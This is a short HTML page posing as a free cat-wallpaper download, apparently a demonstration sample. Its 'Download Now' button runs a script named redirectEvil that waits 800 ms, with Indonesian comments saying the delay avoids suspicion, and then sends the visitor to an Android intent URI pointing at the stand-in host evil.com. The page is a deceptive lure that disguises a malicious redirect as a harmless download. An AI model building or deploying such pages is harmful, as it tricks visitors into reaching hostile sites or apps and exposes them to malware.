<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Free Wallpaper Download</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: sans-serif; text-align: center; padding: 50px; }
    .btn-download {
      background: #4CAF50;
      color: white;
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <h1>Download Free HD Cat Wallpaper</h1>
  <img src="https://placekitten.com/300/200" alt="Cat" style="border-radius:10px;"><br><br>

  <button class="btn-download" onclick="redirectEvil()">Download Now</button>

  <script>
    function redirectEvil() {
      // Delay sedikit agar tidak mencurigakan
      setTimeout(() => {
        // Launch aplikasi atau redirect ke situs berbahaya
        window.location.href = "intent://evil.com#Intent;scheme=https;package=com.android.chrome;end";
      }, 800);
    }
  </script>

</body>
</html>
